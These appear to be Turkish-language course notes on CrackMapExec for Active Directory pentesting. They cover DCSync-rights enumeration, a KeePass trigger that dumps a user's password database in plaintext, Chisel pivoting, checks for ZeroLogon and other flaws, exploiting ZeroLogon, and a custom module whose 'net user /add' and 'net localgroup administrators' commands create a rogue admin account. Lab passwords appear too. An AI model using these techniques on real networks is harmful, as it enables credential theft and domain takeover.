+Bir başka harika modül ise bir veya birden fazla nesnenin DACL'lerini okumamızı ve dışa aktarmamızı sağlayan daclread'dir. Bu modül Active Directory erişimini numaralandırmamızı sağlayacaktır. Aşağıdaki seçeneklere sahiptir:
+
+
+### daclread Module Options
+
+![Pasted image 20241203131203.png](/img/user/resimler/Pasted%20image%2020241203131203.png)
+
+Diyelim ki grace hesabının tüm ACE'lerini okumak istiyoruz. TARGET seçeneğini ve ACTION read seçeneğini kullanabiliriz:
+
+
+### Grace Kullanıcısının DACL'sini Oku
+
+![Pasted image 20241203131236.png](/img/user/resimler/Pasted%20image%2020241203131236.png)
+![Pasted image 20241203131242.png](/img/user/resimler/Pasted%20image%2020241203131242.png)
+
+
+Hangi sorumluların DCSync haklarına sahip olduğu gibi belirli hakları da arayabiliriz. TARGET_DN seçeneğini kullanmamız ve ayırt edici alan adını (DN), okunan ACTION'ı ve RIGHTS seçeneği ile aramak istediğimiz hakları belirtmemiz gerekir.
+
+
+### Searching for Users with DCSync Rights
+![Pasted image 20241203131416.png](/img/user/resimler/Pasted%20image%2020241203131416.png)
+![Pasted image 20241203131423.png](/img/user/resimler/Pasted%20image%2020241203131423.png)
+![Pasted image 20241203131432.png](/img/user/resimler/Pasted%20image%2020241203131432.png)
+
+Çıktıda gösterildiği gibi, ACE[4] robert kullanıcısının hedef domain'de DCSync haklarına sahip olduğunu gösterir.
+
+LDAP'ta birkaç modül daha kullanabiliriz. Modüllerin tam listesini görmek için -L seçeneğini kullanabiliriz.
+
+### LDAP Protocol Modules
+
+![Pasted image 20241203131512.png](/img/user/resimler/Pasted%20image%2020241203131512.png)
+
+
+
+### SMB Protocol Modules
+SMB protokolünde daha fazla modül mevcuttur. CrackMapExec modülünde yaptığımız şeylerin çoğu SMB protokolünü kullanır. İlginç bilgiler elde etmemizi sağlayacak bazı modülleri gözden geçirelim.
+
+Not: SMB kullanan modüllerin çoğunun çalışması için yönetici haklarına ( Pwned! ) ihtiyaç vardır.
+
+
+### SMB Modülleri - get_netconnections ve ioxidresolver
+Bir ağ pentesti üzerinde çalışırken, sürekli olarak daha fazla kaynağa veya ağa erişim elde etmeye çalışırız. CrackMapExec, daha önce tehlikeye attığımız bir makineyi numaralandırmamıza ve birden fazla ağ yapılandırmasına sahip olup olmadığını belirlememize olanak tanıyan bazı modüllere sahiptir. get_netconnections ve ioxidresolver modüllerini kullanalım ve farklarını görelim.
+
+get_netconnections modülü, ağ bağlantılarını sorgulamak için WMI kullanır. IPv6 ve herhangi bir ikincil IP dahil olmak üzere tüm IP adreslerinin yanı sıra domain adını da alır.
+
+
+### get_netconnections Module
+![Pasted image 20241203142100.png](/img/user/resimler/Pasted%20image%2020241203142100.png)
+
+
+Öte yandan, ioxidresolver modülü IP adreslerini sorgulamak için RPC kullanır. Ancak, bu modül IPv6 adreslerini içermez.
+
+
+### ioxidresolver Module
+![Pasted image 20241203142142.png](/img/user/resimler/Pasted%20image%2020241203142142.png)
+![Pasted image 20241203142148.png](/img/user/resimler/Pasted%20image%2020241203142148.png)
+
+Not: İhtiyaçlarımıza en uygun olanı seçebilmemiz için bir modülün nasıl çalıştığını anlamak önemlidir.
+
+
+### SMB Module - keepass_discover
+
+KeePass, kurumsal ağlarda yöneticiler ve kullanıcılar tarafından parolaları ve gizli bilgileri tek bir veritabanında saklamak için yaygın olarak kullanılan ücretsiz, açık kaynaklı bir parola yöneticisidir. Bir ana parola onu korur. Bir KeePass veritabanı alırsak, onu açmak için şifresine ihtiyacımız vardır.
+
+### KeePass'i Keşfetme
+
+![Pasted image 20241203142341.png](/img/user/resimler/Pasted%20image%2020241203142341.png)
+
+Eğer ana parolaya sahip değilsek bir alternatif de Lee Christensen ( @tifkin_) ve Will Schroeder ( @harmj0y) tarafından geliştirilen ve veritabanını açık metin olarak dışa aktarmak için KeePass'ın tetikleme sistemini kullanan bir teknik kullanmaktır. KeePass yapılandırma dosyasını, veritabanını otomatik olarak açık metin olarak dışa aktaran bir [tetikleyici](https://keepass.info/help/v2/triggers.html) içerecek şekilde değiştirir.
+
+Bunu kullanmak için beş (5) adıma ihtiyacımız var:
+
+21. KeePass yapılandırma dosyasını bulun. Biz bunu keepass_discover modülü ile yaptık.
+22. ACTION=ADD seçeneğini ve KEEPASS_CONFIG_PATH öğesini kullanarak trigger'ı yapılandırma dosyasına ekleyin.
+
+### KeePass Yapılandırma Dosyasına Trigger Ekleme
+![Pasted image 20241203142642.png](/img/user/resimler/Pasted%20image%2020241203142642.png)
+Not: KeePass yapılandırma yolu için ters eğik çizgi (/) veya çift eğik çizgi (\) kullandığınızdan emin olun.
+
+Kullanıcının KeePass'i açmasını ve ana parolayı girmesini bekleyin. Bu işlemi zorlamak için ACTION=RESTART seçeneğini kullanarak KeePass.exe prosesini yeniden başlatabiliriz. Hedef makinede oturum açmış çok sayıda kullanıcı varsa, USER=julio gibi kullanıcı adı ile USER seçeneğini ekleyebiliriz.
+
+![Pasted image 20241203142812.png](/img/user/resimler/Pasted%20image%2020241203142812.png)
+
+ACTION=POLL seçeneğini kullanarak dışa aktarılan veritabanını makinemize sorgulayın. Daha sonra şifre girişlerini aramak için grep kullanabiliriz.
+
+
+### Ele Geçirilen Hedeften Dışa Aktarılan Verilerin Yoklanması
+![Pasted image 20241203142916.png](/img/user/resimler/Pasted%20image%2020241203142916.png)
+
+![Pasted image 20241203142924.png](/img/user/resimler/Pasted%20image%2020241203142924.png)
+
+ACTION=CLEAN seçeneğini ve KEEPASS_CONFIG_PATH'i kullanarak yapılandırma dosyasını temizleyin
+
+
+### Clean Configuration File Changes
+
+![Pasted image 20241203143132.png](/img/user/resimler/Pasted%20image%2020241203143132.png)
+![Pasted image 20241203143139.png](/img/user/resimler/Pasted%20image%2020241203143139.png)
+
+Bu modül için her bir seçeneği öğrendik, ancak ACTION=ALL ile hepsini bir kerede alabiliriz. Bu seçeneğin iyi yanı, .xml dosyasında herhangi bir parola girişi arayan ve bunu konsola yazdıran extract_password yöntemini içermesidir.
+
+
+### keeppass_trigger TÜMÜNÜ Tek Komutta Çalıştırma
+
+![Pasted image 20241203143219.png](/img/user/resimler/Pasted%20image%2020241203143219.png)
+![Pasted image 20241203143229.png](/img/user/resimler/Pasted%20image%2020241203143229.png)
+Not: Modül şifreyi yazdırırken sorun yaşayabilir. Bir hata alabiliriz, ancak şifre /tmp/export.xml dosyasında olacaktır, böylece manuel olarak alabiliriz.
+
+
+### RDP'yi Etkinleştirme veya Devre Dışı Bırakma
+Değerlendirme yaparken yapmak isteyebileceğimiz yaygın bir görev, RDP aracılığıyla bir hedef makineye bağlanmaktır. Bu, başka türlü yanal hareket saldırıları gerçekleştiremediğimiz veya standart bir protokol kullanarak radarın altından geçmek istediğimiz bazı senaryolarda yararlı olabilir.
+
+Bağlanmak istediğimiz makinede RDP etkin değilse, buna izin vermek için RDP modülünü kullanabiliriz. ACTION seçeneğini ve ardından enable veya disable seçeneklerini belirtmemiz gerekir.
+
+
+### RDP'yi Etkinleştirme
+![Pasted image 20241203143718.png](/img/user/resimler/Pasted%20image%2020241203143718.png)
+![Pasted image 20241203143723.png](/img/user/resimler/Pasted%20image%2020241203143723.png)
+
+SMB'de birkaç modül daha vardır. Modüllerin tam listesini görmek için -L seçeneğini kullanabiliriz.
+
+
+### SMB Protocol Modules
+![Pasted image 20241203143808.png](/img/user/resimler/Pasted%20image%2020241203143808.png)
+
+Bir sonraki bölümde, ZeroLogon gibi bilinen güvenlik açıklarından yararlanan diğer SMB modüllerine bakacağız
+
+
+### Vulnerability Scan Modules
+Sızma testi yaparken gerçekleştirdiğimiz günlük faaliyetlerden biri güvenlik açıklarını tespit etmeye çalışmaktır. Eğer herhangi birini bulabilirsek, exploitation işi basit olabilir.
+
+CrackMapExec, güvenlik açıklarını tespit etmemizi sağlayan bazı modüller içerir. Bu oturumda bunlardan bazılarını inceleyeceğiz.
+
+
+### Ortamın Kurulması
+Bu senaryoda, bir sunucuyu ele geçirdik ve yönetici kimlik bilgilerini elde ettik. Bu sunucunun iki ağ kartı var ve amacımız domainin saldırıya karşı savunmasız olup olmadığını belirlemek. Domainin IP adresi 172.16.10.3'tür.
+
+Alana erişim sağlamak için, CME ile Proxy Zincirleri bölümünde öğrendiklerimizi kullanacağız ve Chisel ile bir bağlantı kuracağız
+
+
+### Chisel'i Hedef Makineye Gönderme
+![Pasted image 20241203144114.png](/img/user/resimler/Pasted%20image%2020241203144114.png)
+
+
+### Saldırı Hostumuzda Chisel'ı Sunucu Olarak Çalıştırma
+![Pasted image 20241203144152.png](/img/user/resimler/Pasted%20image%2020241203144152.png)
+![Pasted image 20241203144157.png](/img/user/resimler/Pasted%20image%2020241203144157.png)
+
+
+### Chisel'ı Tehlikeye Düşmüş Cihazdan Saldırı Hostumuza Bağlama
+
+![Pasted image 20241203144219.png](/img/user/resimler/Pasted%20image%2020241203144219.png)
+
+
+### Vulnerability Scan Modules
+
+CrackMapExec'teki güvenlik açığı modüllerinin çoğu yalnızca kontrol edilir ve bu modülleri güvenlik açıklarından yararlanmak için kullanamayız. [ZeroLogon güvenlik açığı](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) ile başlayalım.
+
+
+### ZeroLogon
+Kimliği doğrulanmamış bir saldırgan, bir domain controller'a ağ erişimi ile[ ZeroLogon güvenlik açığından (CVE-2020-1472)](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) faydalanabilir. Bu güvenlik açığını kötüye kullanmak ve sonunda domain'in kontrolünü ele geçirmek için savunmasız bir Netlogon oturumu başlatması gerekir. Bir Domain Controller'a bağlanmak başarılı bir saldırı için tek ön koşul olduğundan, güvenlik açığı ciddidir.
+
+CrackMapExec, bir Domain Controller'ın ZeroLogon'a karşı savunmasız olup olmadığını tanımlayan zerologon adlı bir modül içerir.
+
+
+### ZeroLogon Güvenlik Açığı Kontrolü
+![Pasted image 20241203144642.png](/img/user/resimler/Pasted%20image%2020241203144642.png)
+
+
+### PetitPotam
+Güvenlik araştırmacısı Gilles Lionel kısa bir süre önce [PetitPotam](https://github.com/topotam/PetitPotam) adı verilen ve saldırganların sadece kurumsal ağ altyapısına erişim sağlayarak domain'i tehlikeye atmasına olanak tanıyan bir saldırı tekniğini ortaya çıkardı. Yöntem, sunulan herhangi bir sunucu hizmetine (örneğin bir Domain Controller) yönelik klasik bir NTLM relay saldırısıdır. Lionel ayrıca GitHub PetitPotam'da saldırganların domain'i ele geçirmek için bu özel saldırı tekniğini nasıl kullanabileceklerini gösteren bir kavram kanıtı kodu da yayınladı.
+
+CrackMapExec, bir Domain Controller'ın PetitPotam'a karşı savunmasız olup olmadığını tanımlayan petitpotam adlı bir modül içerir.
+
+
+### Petitpotam Güvenlik Açığı Kontrolü
+![Pasted image 20241203144823.png](/img/user/resimler/Pasted%20image%2020241203144823.png)
+
+
+### noPAC
+noPAC güvenlik açığının istismarı, normal bir domain kullanıcısının ayrıcalıklarının bir domain yöneticisine yükseltilmesine izin verdi. Kavram kanıtı (PoC) [GitHub](https://github.com/Ridter/noPac)'da yayınlandı.
+
+CrackMapExec, bir domain controller'ın noPAC'a karşı savunmasız olup olmadığını tanımlayan nopac adlı bir modül içerir.
+
+
+### noPAC vulnerability check
+![Pasted image 20241203144947.png](/img/user/resimler/Pasted%20image%2020241203144947.png)
+![Pasted image 20241203144952.png](/img/user/resimler/Pasted%20image%2020241203144952.png)
+
+
+### DFSCoerce
+Filip Dragovic, DFSCoerce adlı bir NTLM relay saldırısı için bir kavram kanıtı ([PoC](https://github.com/Wh04m1001/DFSCoerce)) yayınladı. Yöntem, bir Windows domain'inin kontrolünü ele geçirmek için Distributed File System: Namespace Management Protocol (MS-DFSNM) kullanarak bir Windows domain'inin kontrolünü ele geçiriyor.
+
+Bu saldırı bir domain kullanıcısı gerektirir ve bir DC'nin savunmasız olup olmadığını belirlemek için CrackMapExec modülü dfscoerce'yi kullanabiliriz. Bu güvenlik açığını kontrol etmek için Y3t4n0th3rP4ssw0rd şifresiyle carole.holmes hesabını kullanacağız.
+
+
+### DFSCoerce Vulnerability Check
+![Pasted image 20241203145115.png](/img/user/resimler/Pasted%20image%2020241203145115.png)
+
+
+### ShadowCoerce
+ShadowCoerce, güvenlik araştırmacısı Lionel Gilles tarafından 2021'in sonlarında PetitPotam saldırısını sergileyen bir sunumun sonunda keşfedildi ve ilk kez detaylandırıldı. Charlie Bromberg bir kavram kanıtı ([PoC](https://github.com/ShutdownRepo/ShadowCoerce)) oluşturdu.
+
+CrackMapExec modülü shadowcoerce kullanarak DC'nin bu saldırıya karşı savunmasız olup olmadığını kontrol etmek için carole.holmes hesabını kullanalım.
+
+
+### ShadowCoerce Vulnerability Check
+![Pasted image 20241203145402.png](/img/user/resimler/Pasted%20image%2020241203145402.png)
+![Pasted image 20241203145408.png](/img/user/resimler/Pasted%20image%2020241203145408.png)
+
+Güvenlik açığı tarama modüllerinin çoğu yazarı, bilgisayarın güvenlik açığı olup olmadığına dair bir mesaj eklememiştir, bu nedenle komut çalıştırıldıktan sonra hiçbir şey görmeyiz. Ancak, ( ./CrackMapExec/cme/modules/shadowcoerce.py) adresinde bulunan shadowcoerse modülünün kaynak kodunu kontrol edersek, yazarın ( logging.debug ) ile bazı hata ayıklama günlükleri eklediğini göreceğiz. CrackMapExec'i hata ayıklama modunda çalıştırırsak, bu günlükleri yazdıracaktır.
+
+CrackMapExec'i hata ayıklama modunda çalıştırmak için protokolden önce --verbose seçeneğini kullanabiliriz
+
+
+### shadowcoerce Modülünü Verbose Enabled ile Çalıştırma
+![Pasted image 20241203145516.png](/img/user/resimler/Pasted%20image%2020241203145516.png)
+![Pasted image 20241203145527.png](/img/user/resimler/Pasted%20image%2020241203145527.png)
+![Pasted image 20241203145547.png](/img/user/resimler/Pasted%20image%2020241203145547.png)
+![Pasted image 20241203145555.png](/img/user/resimler/Pasted%20image%2020241203145555.png)
+![Pasted image 20241203145602.png](/img/user/resimler/Pasted%20image%2020241203145602.png)
+
+DEBUG ile başlayan satırlar logging.debug'a karşılık gelir. Son satırlarda hedefin savunmasız olmadığını gösterdiğini görebiliriz.
+
+
+### MS17-010 (EternalBlue)
+MS17-010, diğer adıyla EternalBlue, Windows işletim sistemleri için Microsft tarafından 14 Mart 2017 tarihinde yayınlanan bir güvenlik yamasıdır. Yama, SMB hizmetindeki kritik bir kimliği doğrulanmamış uzaktan kod çalıştırma açığı içindir. Bu güvenlik açığı hakkında daha fazla bilgi edinmek için [Microsoft Güvenlik Bülteni MS17-010](https://learn.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010?redirectedfrom=MSDN) - Kritik'i okuyabiliriz.
+
+CrackMapExec, bir domain controller'ın MS17-010'a karşı savunmasız olup olmadığını belirleyen ms17-010 adlı bir modül içerir.
+
+
+### MS17-010 Vulnerability Check
+![Pasted image 20241203145753.png](/img/user/resimler/Pasted%20image%2020241203145753.png)
+
+
+### Güvenlik Açığından Yararlanma
+Birçok güvenlik açığı gördük. Onlardan birini istismar etmeye çalışalım: ZeroLogon. Modül tarafından sağlanan bağlantıya gidelim https://github.com/dirkjanm/CVE-2020-1472 ve onu kullanalım:
+
+
+### Exploiting ZeroLogon
+
+![Pasted image 20241203145855.png](/img/user/resimler/Pasted%20image%2020241203145855.png)
+
+![Pasted image 20241203145911.png](/img/user/resimler/Pasted%20image%2020241203145911.png)
+![Pasted image 20241203145928.png](/img/user/resimler/Pasted%20image%2020241203145928.png)
+![Pasted image 20241203145952.png](/img/user/resimler/Pasted%20image%2020241203145952.png)
+
+Diğer güvenlik açıklarından da yararlanmayı deneyebiliriz, ancak yararlanmadan önce hedef makineyi sıfırlamamız gerekir.
+
+Zaman geçtikçe yeni güvenlik açıkları ortaya çıkacaktır ve bunlar sektör uzmanları veya bizim tarafımızdan CrackMapExec'e modül olarak eklenebilir. Bir sonraki bölümde, CrackMapExec için nasıl bir modül oluşturabileceğimizi göreceğiz.
+
+
+### Kendi CME Modülümüzü Oluşturmak
+Yazarlar ve topluluk tarafından oluşturulan birçok yerleşik CrackMapExec modülünü kullandık. Bu bölümde CrackMapExec için modülümüzü nasıl yapabileceğimizi keşfedeceğiz.
+
+
+### CrackMapExec'i Poetry ile derleyin
+Modülümüzü oluşturmadan önce, CrackMapExec projesinin nasıl derleneceğini bilmek çok önemlidir. Bu amaçla CME, projelerimizi oluştururken önerilen [Poetry](https://python-poetry.org/)'yi kullanır. Poetry kullanmıyorsanız, CrackMapExec'i çalıştırmak üzere Poetry kullanmaya başlamak için Kurulum ve Binaryler bölümüne bir göz atın
+
+Şimdi kodu en sevdiğimiz IDE ile açabiliriz. Bu bölümde [VSCode](https://code.visualstudio.com/) kullanacağız. VSCode'u [kurmak](https://code.visualstudio.com/download) için .deb dosyasını kendi web sitesinden indirmemiz gerekiyor. Doğrudan indirme bağlantısı [burada](https://code.visualstudio.com/sha/download?build=stable&os=linux-deb-x64).
+
+
+### VSCode'un Kurulması ve Çalıştırılması
+![Pasted image 20241203150414.png](/img/user/resimler/Pasted%20image%2020241203150414.png)
+
+Daha sonra açmak için kod yazabiliriz 
+
+![Pasted image 20241203150456.png](/img/user/resimler/Pasted%20image%2020241203150456.png)
+
+
+### Yeni Modülümüzü Oluşturun
+Modülümüzü oluşturalım. Yeni bir yönetici hesabı oluşturacak basit bir script oluşturacağız.
+23. ./CrackMapExec/cme/modules klasörü altında createadmin.py adında bir dosya oluşturun.
+24. Aşağıdaki kod örneğini dosyaya kopyalayın:
+
+![Pasted image 20241203150546.png](/img/user/resimler/Pasted%20image%2020241203150546.png)
+![Pasted image 20241203150551.png](/img/user/resimler/Pasted%20image%2020241203150551.png)
+
+25. Şimdi modülümüzü özelleştirelim.
+
+Bazı değişkenleri tanımlamamız gerekiyor:
+* name, modül adını nasıl çağıracağımızı belirtir. Bu durumda, createadmin dosya adını kullanacağız.
+* description modülün amacı için kısa bir açıklamadır. Biz bunu Yeni bir yönetici hesabı oluştur olarak ayarlayacağız.
+* supported_protocols, modülü kullanmak için desteklenen protokolün bir dizisidir. Biz sadece SMB kullanacağız.
+* opsec_safe, modülün çalıştırılmasının güvenli olduğu anlamına gelen bir True veya False değeridir.
+* multiple_hosts, bu modülü birden fazla hedefe karşı çalıştırabileceğimiz anlamına gelir.
+
+Ayrıca, modül için değişkenleri tanımlamak için kullanılan options() yöntemine de sahip olacağız. Bu durumda, USER ve PASS olmak üzere iki seçenek ekleyeceğiz. Her seçeneğin varsayılan değeri olabilir ya da olmayabilir. Bu yazara bağlıdır. USER için varsayılan değeri düz metin olarak ve PASS için varsayılan değeri HackTheBoxCME! . Ayrıca USER o PASS modül seçeneğinin boş olup olmadığını doğrulamak için bir kontrol ekledik. Eğer durum buysa, modülden çıkılacaktır.
+
+![Pasted image 20241203150803.png](/img/user/resimler/Pasted%20image%2020241203150803.png)
+![Pasted image 20241203150814.png](/img/user/resimler/Pasted%20image%2020241203150814.png)
+
+26. Daha sonra, on_admin_login() metodunu kullanarak yürütme ile çalışacağız. Bu metot değişkenlerimizi almaktan ve hedeflere istediğimiz herhangi bir görevi yürütmekten sorumludur. Çıktı olarak context.log.info ve context.log.highlight metotlarını kullanacağız (farklı renklere sahipler).
+
+Bu yürütme için, yöntemin connection.execute(command, True) komutunu kullanarak bir cmd.exe komutu çalıştıracağız. Komutumuz, yeni bir kullanıcı eklemek için net user username password /add /Y değeriyle ve kullanıcıyı administrators grubuna eklemek için net localgroup administrators username /add değeriyle command değişkenine kaydedilecektir.
+
+![Pasted image 20241203150911.png](/img/user/resimler/Pasted%20image%2020241203150911.png)
+![Pasted image 20241203150916.png](/img/user/resimler/Pasted%20image%2020241203150916.png)
+
+Son olarak, yeni modülümüz şu şekilde görünmelidir:
+![Pasted image 20241203150932.png](/img/user/resimler/Pasted%20image%2020241203150932.png)
+![Pasted image 20241203151010.png](/img/user/resimler/Pasted%20image%2020241203151010.png)
+![Pasted image 20241203151027.png](/img/user/resimler/Pasted%20image%2020241203151027.png)
+
+
+### Modülümüzü Çalıştırma
+Şimdi modülümüzü herhangi bir seçenekle veya herhangi bir seçenek olmadan çalıştırabiliriz. Önce varsayılan değerlerle çalıştırarak sonuçları görelim.
+
+
+### CME Modülümüzün Çalıştırılması createadmin
+![Pasted image 20241203151110.png](/img/user/resimler/Pasted%20image%2020241203151110.png)
+
+Daha sonra, hem kullanıcı adı hem de parola belirterek çalıştırabiliriz.
+
+![Pasted image 20241203151145.png](/img/user/resimler/Pasted%20image%2020241203151145.png)
+![Pasted image 20241203151149.png](/img/user/resimler/Pasted%20image%2020241203151149.png)
+
+İlk modülümüz çalışıyor, ancak çok daha iyi olabilir. Yürütmeyi iki komuta bölebilir ve kullanıcı zaten oluşturulmuşsa veya şifre politikalara uymuyorsa bir hata gösterebiliriz.
+
+Ayrıca context.log.highlight(p)'den değeri alabilir ve bir hata varsa farklı bir şey gösterebiliriz. Bu kodu geliştirmek için fikirleriniz nelerdir?
+
+Bir şeyleri yapmanın her zaman farklı yolları olacaktır. Bu modülde neleri değiştireceğinizi ve bunu nasıl daha iyi yapacağınızı keşfedin. Bu modülü daha da özelleştirmek, kendi modüllerinizi oluşturmaya başlamak için harika bir yerdir.
+
+
+### Diğer Yazarlardan Öğrenmek
+Artık yeni bir modül oluşturmanın temellerini öğrendiğimize göre, diğer modülleri keşfetmeli ve birkaç fikir edinmeliyiz.
+
+Örneğin, procdump.py modülü procdump.exe çalıştırılabilir dosyasını bir Base64 dizesi olarak kaydeder, ardından Base64 dizesini bir dosyaya dönüştürür ve hedef işletim sisteminde tutar. LSASS'ın işlem kimliğini almak için tasklist komutunu çalıştırır, bunu bir değişkene kaydeder ve işlem kimliğini procdump.exe'nin yürütülmesine bir argüman olarak geçirir.
+
+Başka bir örnek get_description.py . Bu modülü groupmembership modülünü oluşturmak için örnek olarak aldık. Bu modül, bir sorgu gerçekleştirmek ve memberOf özniteliğini almak için ihtiyaç duyduğumuz gibi, sonuçlarını bir LDAP sorgusuna dayalı olarak alır. Kodda bazı değişiklikler yaptık, yeni bir modül oluşturduk ve bir çekme isteği gönderdik. Çekme isteği kabul edildikten sonra tüm topluluk tarafından kullanılabilir olacaktır.
+
+Yeni modüller oluşturmak için MSSQL gibi diğer protokoller için başka örneklere de bakabiliriz.
+
+
+### Çekme İsteği Oluşturma
+CrackMapExec gibi bir proje topluluk tarafından canlı tutulur. Modülümüzün tüm topluluk tarafından kullanılabilir hale geleceği ve aracın kendisinin bir parçası olarak dahil edileceği bir çekme isteği ekleyerek projeye katkıda bulunabiliriz.
+
+Bir çekme isteği yapmak için [GitHub](https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/creating-a-pull-request) kılavuzunu takip edebilir ve CrackMapExec'e katkıda bulunabiliriz.
+
+İlerleyen bölümlerde, CrackMapExec kullanımı için IPv6, Kerberos Kimlik Doğrulama ve CrackMapExec veritabanında uzmanlaşma gibi bazı bonus konuları tartışacağız.
+
+
+
+### Ek CME İşlevselliği
+CrackMapExec, çeşitli senaryolarda çok faydalı olacak başka yardımcı programlara da sahiptir. Bu bölümde, bunlardan üçünü inceleyeceğiz:
+
+* Audit (Denetim) modu
+* IPv6 desteği
+* Birden fazla cihaza saldırırken tamamlanma yüzdesi
+
+### Audit Mode
+
+5.3.0 sürümünde yeni bir mod eklendi: audit modu. Bu mod, şifreyi veya hash'i tercih ettiğimiz bir karakterle veya hatta en sevdiğimiz emoji ile değiştirir. Bu özellik, bir müşteri raporu yazarken ekran görüntüsünün bulanıklaşmasını önlemeye yardımcı olur.
+
+Audit modunu yapılandırmak için, varsayılan olarak ~/.cme/cme.conf adresinde bulunan yapılandırma dosyasını düzenlememiz ve audit_mode parametresini tercih ettiğimiz karakterle değiştirmemiz gerekir. Bu karakter, CrackMapExec çalıştırılırken parolanın veya hash'in yerini alacaktır. Bu örnek için # karakterini kullanacağız
+
+
+### Enabling Audit Mode
+
+![Pasted image 20241203151754.png](/img/user/resimler/Pasted%20image%2020241203151754.png)
+
+Şimdi çalıştırabilir ve parolanın çıktıda ######## ile değiştirildiğini görebiliriz.
+
+![Pasted image 20241203151816.png](/img/user/resimler/Pasted%20image%2020241203151816.png)
+
+Gördüğümüz gibi, çalıştırma sonucundaki parola # karakteri ile değiştirilir. Ancak, komut şifreyi gösterir. Bu gibi durumlarda, istenen komutu çalıştırmadan önce parolayı bir dosyaya kaydetmek idealdir.
+
+### Denetim Modu Dosyadaki Parola ile Etkinleştirildi
+![Pasted image 20241203151858.png](/img/user/resimler/Pasted%20image%2020241203151858.png)
+
+
+### IPv6 Support
+CrackMapExec'in bir diğer özelliği de IPv6 üzerinden iletişimi desteklemesidir. Çoğu kuruluş, kullanmasalar bile IPv6'yı varsayılan olarak etkinleştirmiştir ve IPv6'nın IPv4'e göre günlük düzeyinde daha az izlenmesi veya anlaşılması bile mümkündür. Bu da ağ saldırılarının gerçekleştirilmesi ve tespit edilmemesi için bir fırsat yaratmaktadır.
+
+Popüler modüller bölümünde gördüğümüz gibi CrackMapExec get_netconnections modülü ile bilgisayarların IPv6'sını tespit etmemizi sağlıyor. Bu modülü kullanalım ve ardından komutu IPv6 üzerinden çalıştırmayı deneyelim.
+
+
+### get_netconnections Modülünü Çalıştırma ve IPv6 Kullanma
+
+![Pasted image 20241203152004.png](/img/user/resimler/Pasted%20image%2020241203152004.png)
+![Pasted image 20241203152012.png](/img/user/resimler/Pasted%20image%2020241203152012.png)
+
+Şimdi IPv6 üzerinden hedefe erişelim.
+![Pasted image 20241203152032.png](/img/user/resimler/Pasted%20image%2020241203152032.png)
+![Pasted image 20241203152041.png](/img/user/resimler/Pasted%20image%2020241203152041.png)
+![Pasted image 20241203152051.png](/img/user/resimler/Pasted%20image%2020241203152051.png)
+
+
+
+### Tamamlanma Yüzdesi
+
+Artık bir tarama çalışırken enter tuşuna basabilirsiniz ve CME size tamamlanma yüzdesini ve taranacak kalan host sayısını verecektir. Bu modül laboratuvarında her seferinde bir host'a saldırıyoruz, ancak daha kapsamlı bir ağ bulduğunuzda, büyük olasılıkla bu özelliği kullanacaksınız. Şimdilik --shares seçeneğini çalıştıralım ve bitmeden önce enter tuşuna basalım.
+
+
+### Tamamlanma Yüzdesi
+![Pasted image 20241203152158.png](/img/user/resimler/Pasted%20image%2020241203152158.png)
+
+Aşağıdaki bölümde, Kerberos kimlik doğrulamasını ve CrackMapExec'in bu kimlik doğrulama yöntemi için içerdiği yeni değişiklikleri tartışacağız.
+
+
+### Kerberos Authentication
+
+Yazma sırasında CrackMapEec, SMB, LDAP ve MSSQL protokolleri için Kerberos Kimlik Doğrulamasını desteklemektedir. Kerberos Kimlik Doğrulamasını kullanmanın iki (2) yolu vardır:
+
+27. ccache dosyasını belirtmek için KRB5CCNAME env adını kullanma. Password Attacks academy modülündeki Pass the Ticket (PtT) from Linux bölümünde Linux'tan Kerberos kullanımı anlatılmaktadır
+28. CrackMapExec 5.4.0'dan başlayarak, artık Kerberos kimlik doğrulaması için bir biletle KRB5CCNAME ortam değişkenini kullanmamız gerekmiyor. Bir kullanıcı adı ve parola veya kullanıcı adı ve hash kullanabiliriz.
+
+Linux'ta Kerberos kimlik doğrulamasını kullanırken göz önünde bulundurulması gereken önemli bir unsur, saldırdığımız bilgisayarın domain ve hedef makinenin FQDN'sini çözümlemesi gerektiğidir. Dahili bir ağdaysak, bilgisayarımızı şirketin DNS'sine domain adı çözümlemeleri yapacak şekilde yapılandırabiliriz, ancak durum böyle değildir. DNS'i yapılandıramayız ve /etc/hosts dosyasına domain controller ve hedef makinemiz için FQDN'i manuel olarak eklememiz gerekecektir.
+
+
+### Setting Up the /etc/hosts File
+
+![Pasted image 20241203152738.png](/img/user/resimler/Pasted%20image%2020241203152738.png)
+
+![Pasted image 20241203152745.png](/img/user/resimler/Pasted%20image%2020241203152745.png)
+
+CrackMapExec'i Kerberos kimlik doğrulaması ile kullanmayı deneyelim.
+
+
+### Username and Password - Kerberos Authentication
+CrackMapExec'i -k veya --kerberos seçeneği olmadan bir kullanıcı adı ve parola veya kullanıcı adı ve hash ile kullandığımızda, NTLM kimlik doğrulaması gerçekleştiririz. Kerberos seçeneğini kullanırsak bunun yerine Kerberos kimlik doğrulamasını kullanabiliriz.
+
+### Kerberos Authentication
+![Pasted image 20241203152841.png](/img/user/resimler/Pasted%20image%2020241203152841.png)
+![Pasted image 20241203152849.png](/img/user/resimler/Pasted%20image%2020241203152849.png)
+
+
+
+### Kerberos Kimlik Doğrulaması ile Kullanıcıları Tanımlama
+
+Yeni Kerberos kimlik doğrulama uygulaması ile CrackMapExec, CME içinde kendi Kerbrute'unu oluşturmak için tüm bileşenlere sahiptir. Bu, CME'nin bir kullanıcının domain üzerinde var olup olmadığını ve bu kullanıcının Kerberos ön kimlik doğrulaması (ASREPRoasting) gerektirmeyecek şekilde yapılandırılıp yapılandırılmadığını anlayabileceği anlamına gelir. Bunu aşağıdaki hesaplarla çalışırken görelim: account_not_exist , julio , ve robert .
+
+
+### Kerberos Kimlik Doğrulaması ile Kullanıcıları Tanımlama
+![Pasted image 20241203152959.png](/img/user/resimler/Pasted%20image%2020241203152959.png)
+
+Gördüğümüz gibi, Kerbrute CrackMapExec TGT isteklerini ön kimlik doğrulaması olmadan gönderdiğinden, KDC bir KDC_ERR_C_PRINCIPAL_UNKNOWN hatasıyla yanıt verirse, kullanıcı adı mevcut değildir. Ancak, KDC ön kimlik doğrulaması isterse, KDC_ERR_PREAUTH_FAILED hatasıyla yanıt verir, bu da kullanıcı adının mevcut olduğu anlamına gelir. Son olarak, asreproast saldırısına karşı savunmasız bir hata hesabı görürsek, daha önce AESREPRoast Hesaplarını Bulma bölümünde gördüğümüz gibi AESREPoast saldırılarına karşı hassastır.
+
